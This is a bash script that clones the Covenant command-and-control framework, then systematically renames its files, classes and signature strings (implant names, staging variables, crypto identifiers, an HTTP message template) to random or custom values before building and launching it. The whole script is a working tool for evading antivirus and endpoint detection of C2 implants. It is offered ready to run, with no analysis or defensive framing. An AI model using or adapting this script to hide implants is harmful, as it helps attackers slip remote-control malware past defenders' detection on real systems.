#!/bin/bash

# Script provided by Aaron Jennejahn who gets all the credit. Snags Covenant from GitHub, performs obfuscation operations to modify
# things that are often detected as indicators of compromise and launches the C2 framework.

# Modify the 4 strings below to customize if desired.

covenant="Herd"
grunt="Moose"
stager="Calf"
guid="myid"

if [[ $1 == "dev" ]]; then
        git clone --recurse-submodules --branch dev https://github.com/cobbr/Covenant.git /opt/Covenant
else
        git clone --recurse-submodules https://github.com/cobbr/Covenant.git /opt/Covenant
fi

cd /opt/Covenant/Covenant/
if [[ $1 == "dev" ]]; then
        mv ../Covenant.API/ ./${covenant}.API/
        mv ./Data/ImplantTemplates/GruntBridge/ ./Data/ImplantTemplates/${grunt}Bridge/
        mv ./Data/ImplantTemplates/GruntHTTP/ ./Data/ImplantTemplates/${grunt}HTTP/
        mv ./Data/ImplantTemplates/GruntSMB/ ./Data/ImplantTemplates/${grunt}SMB/
        mv ./Data/ImplantTemplates/Brute/BruteStager/BruteStager.csproj ./Data/ImplantTemplates/Brute/BruteStager/Brute${stager}.csproj
        mv ./Data/ImplantTemplates/Brute/BruteStager/BruteStager.sln ./Data/ImplantTemplates/Brute/BruteStager/Brute${stager}.sln
        mv ./Data/ImplantTemplates/Brute/BruteStager ./Data/ImplantTemplates/Brute/Brute${stager}
else
        mv ./Data/Grunt/GruntBridge/ ./Data/Grunt/${grunt}Bridge/
        mv ./Data/Grunt/GruntHTTP/ ./Data/Grunt/${grunt}HTTP/
        mv ./Data/Grunt/GruntSMB/ ./Data/Grunt/${grunt}SMB/
        mv ./Data/Grunt/ ./Data/${grunt}/
fi
mv ./Data/AssemblyReferences/ ../AssemblyReferences/
mv ./Data/ReferenceSourceLibraries/ ../ReferenceSourceLibraries/
mv ./Data/EmbeddedResources/ ../EmbeddedResources/
mv ./Models/Covenant/ ./Models/${covenant}/
mv ./Components/CovenantUsers/ ./Components/${covenant}Users/
mv ./Components/Grunts/ ./Components/${grunt}s/
mv ./Models/Grunts/ ./Models/${grunt}s/
mv ./Components/GruntTaskings/ ./Components/${grunt}Taskings/
mv ./Components/GruntTasks/ ./Components/${grunt}Tasks/

find ./ -type f -print0 | xargs -0 sed -i "s/Grunt/${grunt}/g"
find ./ -type f -print0 | xargs -0 sed -i "s/GRUNT/${grunt^^}/g"
find ./ -type f -print0 | xargs -0 sed -i "s/grunt/${grunt,,}/g"
if [[ $1 == "dev" ]]; then
        find ./ -type f -print0 | xargs -0 sed -i "s/Stager/${stager}/g"
fi
find ./ -type f -print0 | xargs -0 sed -i "s/Covenant/${covenant}/g"
find ./ -type f -print0 | xargs -0 sed -i "s/COVENANT/${covenant^^}/g"
find ./ -type f -name "sync.py" -print0 | xargs -0 sed -i "s/covenant/${covenant,}/g"

#obfuscate templates
find ./ -type f -name "*.yaml" -print0 | xargs -0 sed -i "s/i=a19ea23062db990386a3a478cb89d52e&data={DATA}&session=75db-99b1-25fe4e9afbe58696-320bea73/pup={DATA}/g"
if [[ $1 == "dev" ]]; then
        find ./ -type f -name "GruntSMB.yaml" -print0 | xargs -0 sed -i "s/PipeSecurity ps = new PipeSecurity();/PipeSecurity ps = new PipeSecurity();Console.Write(\"\");/g"
        find ./ -type f -name "GruntSMB.yaml" -print0 | xargs -0 sed -i "s/ps.AddAccessRule(new PipeAccessRule(new SecurityIdentifier(WellKnownSidType.WorldSid, null), PipeAccessRights.FullControl, AccessControlType.Allow));/ps.AddAccessRule(new PipeAccessRule(new SecurityIdentifier(WellKnownSidType.WorldSid, null), PipeAccessRights.FullControl, AccessControlType.Allow));Console.Write(\"\");/g"
else
        find ./ -type f -name "GruntSMBStager.cs" -print0 | xargs -0 sed -i "s/PipeSecurity ps = new PipeSecurity();/PipeSecurity ps = new PipeSecurity();Console.Write(\"\");/g"
        find ./ -type f -name "GruntSMBStager.cs" -print0 | xargs -0 sed -i "s/ps.AddAccessRule(new PipeAccessRule(new SecurityIdentifier(WellKnownSidType.WorldSid, null), PipeAccessRights.FullControl, AccessControlType.Allow));/ps.AddAccessRule(new PipeAccessRule(new SecurityIdentifier(WellKnownSidType.WorldSid, null), PipeAccessRights.FullControl, AccessControlType.Allow));Console.Write(\"\");/g"
fi

string=$(cat /dev/urandom | tr -dc "a-zA-Z" | fold -w 5 | head -n 1)
find ./ -type f -print0 | xargs -0 sed -i "s/SetupAES/$string/g"
string=$(cat /dev/urandom | tr -dc "a-zA-Z" | fold -w 5 | head -n 1)
find ./ -type f -print0 | xargs -0 sed -i "s/SessionKey/$string/g"
string=$(cat /dev/urandom | tr -dc "a-zA-Z" | fold -w 5 | head -n 1)
find ./ -type f -print0 | xargs -0 sed -i "s/EncryptedChallenge/$string/g"

string=$(cat /dev/urandom | tr -dc "a-zA-Z" | fold -w 5 | head -n 1)
find ./ -type f -print0 | xargs -0 sed -i "s/DecryptedChallenges/$string/g"
string=$(cat /dev/urandom | tr -dc "a-zA-Z" | fold -w 5 | head -n 1)
find ./ -type f -print0 | xargs -0 sed -i "s/Stage0Body/$string/g"
string=$(cat /dev/urandom | tr -dc "a-zA-Z" | fold -w 5 | head -n 1)
find ./ -type f -print0 | xargs -0 sed -i "s/Stage0Response/$string/g"
string=$(cat /dev/urandom | tr -dc "a-zA-Z" | fold -w 5 | head -n 1)
find ./ -type f -print0 | xargs -0 sed -i "s/Stage0Bytes/$string/g"
string=$(cat /dev/urandom | tr -dc "a-zA-Z" | fold -w 5 | head -n 1)
find ./ -type f -print0 | xargs -0 sed -i "s/Stage1Body/$string/g"
string=$(cat /dev/urandom | tr -dc "a-zA-Z" | fold -w 5 | head -n 1)
find ./ -type f -print0 | xargs -0 sed -i "s/Stage1Response/$string/g"
string=$(cat /dev/urandom | tr -dc "a-zA-Z" | fold -w 5 | head -n 1)
find ./ -type f -print0 | xargs -0 sed -i "s/Stage1Bytes/$string/g"
string=$(cat /dev/urandom | tr -dc "a-zA-Z" | fold -w 5 | head -n 1)
find ./ -type f -print0 | xargs -0 sed -i "s/Stage2Body/$string/g"
string=$(cat /dev/urandom | tr -dc "a-zA-Z" | fold -w 5 | head -n 1)
find ./ -type f -print0 | xargs -0 sed -i "s/Stage2Response/$string/g"
string=$(cat /dev/urandom | tr -dc "a-zA-Z" | fold -w 5 | head -n 1)
find ./ -type f -print0 | xargs -0 sed -i "s/Stage2Bytes/$string/g"

find ./ -type f -print0 | xargs -0 sed -i "s/message64str/mEssaGe64str/g"
find ./ -type f -print0 | xargs -0 sed -i "s/messageBytes/mEssaGebytes/g"
find ./ -type f -print0 | xargs -0 sed -i "s/totalReadBytes/TotaLReaDBytes/g"
find ./ -type f -print0 | xargs -0 sed -i "s/deflateStream/dEflatesTream/g"
find ./ -type f -print0 | xargs -0 sed -i "s/memoryStream/meMorYStream/g"
find ./ -type f -print0 | xargs -0 sed -i "s/compressedBytes/pkdbytes/g"


find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/GUID/${guid^^}/g"
find ./ -type f -name "*.razor" -print0 | xargs -0 sed -i "s/GUID/${guid^^}/g"
find ./ -type f -name "*.json" -print0 | xargs -0 sed -i "s/GUID/${guid^^}/g"
find ./ -type f -name "*.yaml" -print0 | xargs -0 sed -i "s/GUID/${guid^^}/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/guid/${guid,,}/g"
find ./ -type f -name "*.razor" -print0 | xargs -0 sed -i "s/guid/${guid,,}/g"
find ./ -type f -name "*.json" -print0 | xargs -0 sed -i "s/guid/${guid,,}/g"
find ./ -type f -name "*.yaml" -print0 | xargs -0 sed -i "s/guid/${guid,,}myid/g"


find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/REPLACE_/REP_/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/_PROFILE_/_PROF_/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/_VALIDATE_/_VAL_/g"
find ./ -type f -name "*.yaml" -print0 | xargs -0 sed -i "s/REPLACE_/REP_/g"
find ./ -type f -name "*.yaml" -print0 | xargs -0 sed -i "s/_PROFILE_/_PROF_/g"
find ./ -type f -name "*.yaml" -print0 | xargs -0 sed -i "s/_VALIDATE_/_VAL_/g"

string=$(cat /dev/urandom | tr -dc "a-zA-Z" | fold -w 5 | head -n 1)
find ./ -type f -print0 | xargs -0 sed -i "s/ProfileHttp/$string/g"
find ./ -type f -print0 | xargs -0 sed -i "s/baseMessenger/bAsemEsSenger/g"

string=$(cat /dev/urandom | tr -dc "a-zA-Z" | fold -w 5 | head -n 1)
find ./ -type f -print0 | xargs -0 sed -i "s/PartiallyDecrypted/$string/g"
string=$(cat /dev/urandom | tr -dc "a-zA-Z" | fold -w 5 | head -n 1)
find ./ -type f -print0 | xargs -0 sed -i "s/FullyDecrypted/$string/g"
string=$(cat /dev/urandom | tr -dc "a-zA-Z" | fold -w 5 | head -n 1)
find ./ -type f -print0 | xargs -0 sed -i "s/compressedBytes/$string/g"

string=$(cat /dev/urandom | tr -dc "a-zA-Z" | fold -w 5 | head -n 1)
find ./ -type f -print0 | xargs -0 sed -i "s/CookieWebClient/$string/g"
find ./ -type f -print0 | xargs -0 sed -i "s/Jitter/JiTter/g"
find ./ -type f -print0 | xargs -0 sed -i "s/ConnectAttempts/ConneCTAttEmpts/g"
find ./ -type f -print0 | xargs -0 sed -i "s/RegisterBody/RegsBody/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/messenger/meSsenGer/g"
string=$(cat /dev/urandom | tr -dc "a-zA-Z" | fold -w 5 | head -n 1)
find ./ -type f -print0 | xargs -0 sed -i "s/Hello World/$string/g"
find ./ -type f -print0 | xargs -0 sed -i "s/ValidateCert/ValidaTeCerTs/g"
find ./ -type f -print0 | xargs -0 sed -i "s/UseCertPinning/UseCertPinnIng/g"
string=$(cat /dev/urandom | tr -dc "a-zA-Z" | fold -w 5 | head -n 1)
find ./ -type f -print0 | xargs -0 sed -i "s/EncryptedMessage/$string/g"
string=$(cat /dev/urandom | tr -dc "a-zA-Z" | fold -w 5 | head -n 1)
find ./ -type f -print0 | xargs -0 sed -i "s/cookieWebClient/$string/g"
string=$(cat /dev/urandom | tr -dc "a-zA-Z" | fold -w 5 | head -n 1)
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/aes/$string/g"
string=$(cat /dev/urandom | tr -dc "a-zA-Z" | fold -w 5 | head -n 1)
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/aes2/$string/g"
string=$(cat /dev/urandom | tr -dc "a-zA-Z" | fold -w 5 | head -n 1)
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/array5/$string/g"
string=$(cat /dev/urandom | tr -dc "a-zA-Z" | fold -w 5 | head -n 1)
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/array6/$string/g"
string=$(cat /dev/urandom | tr -dc "a-zA-Z" | fold -w 5 | head -n 1)
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/array4/$string/g"
string=$(cat /dev/urandom | tr -dc "a-zA-Z" | fold -w 5 | head -n 1)
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/array7/$string/g"
string=$(cat /dev/urandom | tr -dc "a-zA-Z" | fold -w 5 | head -n 1)
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/array1/$string/g"
string=$(cat /dev/urandom | tr -dc "a-zA-Z" | fold -w 5 | head -n 1)
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/array2/$string/g"
string=$(cat /dev/urandom | tr -dc "a-zA-Z" | fold -w 5 | head -n 1)
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/array3/$string/g"
string=$(cat /dev/urandom | tr -dc "a-zA-Z" | fold -w 5 | head -n 1)
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/list1/$string/g"
string=$(cat /dev/urandom | tr -dc "a-zA-Z" | fold -w 5 | head -n 1)
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/list2/$string/g"
string=$(cat /dev/urandom | tr -dc "a-zA-Z" | fold -w 5 | head -n 1)
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/list3/$string/g"
string=$(cat /dev/urandom | tr -dc "a-zA-Z" | fold -w 5 | head -n 1)
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/list4/$string/g"
string=$(cat /dev/urandom | tr -dc "a-zA-Z" | fold -w 5 | head -n 1)
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/list5/$string/g"
string=$(cat /dev/urandom | tr -dc "a-zA-Z" | fold -w 5 | head -n 1)
find ./ -type f \( -name \*.cs -o -iname \*.yaml \) -print0 | xargs -0 sed -i "s/group0/$string/g"
string=$(cat /dev/urandom | tr -dc "a-zA-Z" | fold -w 5 | head -n 1)
find ./ -type f \( -name \*.cs -o -iname \*.yaml \) -print0 | xargs -0 sed -i "s/group1/$string/g"
string=$(cat /dev/urandom | tr -dc "a-zA-Z" | fold -w 5 | head -n 1)
find ./ -type f \( -name \*.cs -o -iname \*.yaml \) -print0 | xargs -0 sed -i "s/group2/$string/g"
string=$(cat /dev/urandom | tr -dc "a-zA-Z" | fold -w 5 | head -n 1)
find ./ -type f \( -name \*.cs -o -iname \*.yaml \) -print0 | xargs -0 sed -i "s/group3/$string/g"
string=$(cat /dev/urandom | tr -dc "a-zA-Z" | fold -w 5 | head -n 1)
find ./ -type f \( -name \*.cs -o -iname \*.yaml \) -print0 | xargs -0 sed -i "s/group4/$string/g"
string=$(cat /dev/urandom | tr -dc "a-zA-Z" | fold -w 5 | head -n 1)
find ./ -type f \( -name \*.cs -o -iname \*.yaml \) -print0 | xargs -0 sed -i "s/group5/$string/g"
string=$(cat /dev/urandom | tr -dc "a-zA-Z" | fold -w 5 | head -n 1)
find ./ -type f \( -name \*.cs -o -iname \*.yaml \)  -print0 | xargs -0 sed -i "s/group6/$string/g"
string=$(cat /dev/urandom | tr -dc "a-zA-Z" | fold -w 5 | head -n 1)
find ./ -type f \( -name \*.cs -o -iname \*.yaml \) -print0 | xargs -0 sed -i "s/group7/$string/g"
string=$(cat /dev/urandom | tr -dc "a-zA-Z" | fold -w 5 | head -n 1)
find ./ -type f \( -name \*.cs -o -iname \*.yaml \) -print0 | xargs -0 sed -i "s/group8/$string/g"


find ./ -type f -name "*Grunt*" | while read FILE ; do
        newfile="$(echo ${FILE} |sed -e "s/Grunt/${grunt}/g")";
        mv "${FILE}" "${newfile}";
done
find ./ -type f -name "*GRUNT*" | while read FILE ; do
        newfile="$(echo ${FILE} |sed -e "s/GRUNT/${grunt^^}/g")";
        mv "${FILE}" "${newfile}";
done

find ./ -type f -name "*grunt*" | while read FILE ; do
        newfile="$(echo ${FILE} |sed -e "s/grunt/${grunt,,}/g")";
        mv "${FILE}" "${newfile}";
done

find ./ -type f -name "*Covenant*" | while read FILE ; do
        newfile="$(echo ${FILE} |sed -e "s/Covenant/${covenant}/g")";
        mv "${FILE}" "${newfile}";
done

find ./ -type f -name "*COVENANT*" | while read FILE ; do
        newfile="$(echo ${FILE} |sed -e "s/COVENANT/${covenant^^}/g")";
        mv "${FILE}" "${newfile}";
done


if [[ $1 == "dev" ]]; then
        mv ./${covenant}.API/ ../
fi
mv ../AssemblyReferences/ ./Data/
mv ../ReferenceSourceLibraries/ ./Data/
mv ../EmbeddedResources/ ./Data/

dotnet build
dotnet run
